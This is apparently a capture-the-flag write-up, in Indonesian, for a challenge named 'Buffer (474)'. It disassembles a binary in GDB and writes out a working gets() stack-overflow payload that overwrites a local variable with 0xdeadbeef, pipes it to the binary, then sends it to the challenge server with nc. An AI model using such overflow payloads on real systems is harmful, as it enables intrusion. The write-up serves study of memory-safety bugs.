# Buffer \(474\)

> They say gets in C is not safe, can you guess it why?
>
> `nc 103.200.4.156 8360`

###### POC

Kami menggunakan GDB-Peda, untuk proses debugging

```
>> gdb -q ./buf
```

```
gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x080482ec  _init
0x08048320  printf@plt
0x08048330  gets@plt
0x08048340  system@plt
0x08048350  __libc_start_main@plt
0x08048360  __gmon_start__@plt
0x08048370  _start
0x080483a0  __x86.get_pc_thunk.bx
0x080483b0  deregister_tm_clones
0x080483e0  register_tm_clones
0x08048420  __do_global_dtors_aux
0x08048440  frame_dummy
0x0804846b  main
0x080484d0  __libc_csu_init
0x08048530  __libc_csu_fini
0x08048534  _fini
```

Okee.. lanjut ke fungsi **main** sekarang ^\_^

```
gdb-peda$ pdisass main
Dump of assembler code for function main:
   0x0804846b <+0>:    push   ebp
   0x0804846c <+1>:    mov    ebp,esp
   0x0804846e <+3>:    sub    esp,0x18
   0x08048471 <+6>:    mov    DWORD PTR [ebp-0x4],0x64
   0x08048478 <+13>:    mov    DWORD PTR [ebp-0x8],0xc8
   0x0804847f <+20>:    lea    eax,[ebp-0x18]
   0x08048482 <+23>:    push   eax
   0x08048483 <+24>:    call   0x8048330 <gets@plt>
   0x08048488 <+29>:    add    esp,0x4
   0x0804848b <+32>:    cmp    DWORD PTR [ebp-0x8],0xdeadbeef
   0x08048492 <+39>:    jne    0x80484b0 <main+69>
   0x08048494 <+41>:    push   0x8048550
   0x08048499 <+46>:    call   0x8048340 <system@plt>
   0x0804849e <+51>:    add    esp,0x4
   0x080484a1 <+54>:    push   0x804855e
   0x080484a6 <+59>:    call   0x8048320 <printf@plt>
   0x080484ab <+64>:    add    esp,0x4
   0x080484ae <+67>:    jmp    0x80484bd <main+82>
   0x080484b0 <+69>:    push   0x804856b
   0x080484b5 <+74>:    call   0x8048320 <printf@plt>
   0x080484ba <+79>:    add    esp,0x4
   0x080484bd <+82>:    mov    eax,0x0
   0x080484c2 <+87>:    leave  
   0x080484c3 <+88>:    ret    
End of assembler dump.
```

Dari address **0x0804848b **terdapat pengecekan local variable **$ebp-0x8 **dengan **0xdeadbeef**

Jadi tujuan kita adalah menempa value dari local variable **$ebp-0x8 **yang semula **0xc8** atau **200** \(desimal\) di ganti dengan **0xdeadbeef **agar lolos pada saat pengecekan di address **0x0804848b**.

* Pertama kita mengecek jarak dari variable yang menampung isi dari fungsi gets yaitu **$ebp-0x18** dengan local variable **$ebp-0x8**

```
gdb-peda$ distance $ebp-0x18 $ebp-0x8
From 0xffffffe8 to 0xfffffff8: 16 bytes, 4 dwords
```

* Lanjut kita bikin payloadnya, untuk menempa local variable tersebut

```
>> python -c "print 'A'*16 + '\xef\xbe\xad\xde'" | ./buf
/bin/cat: flag: No such file or directory
You got Me!!
```

* Okee berhasil.. tinggal di eksekusi ke server soal ctfnya aja wkw

```
>> python -c "print 'A'*16 + '\xef\xbe\xad\xde'" | nc {ip} {port}
```



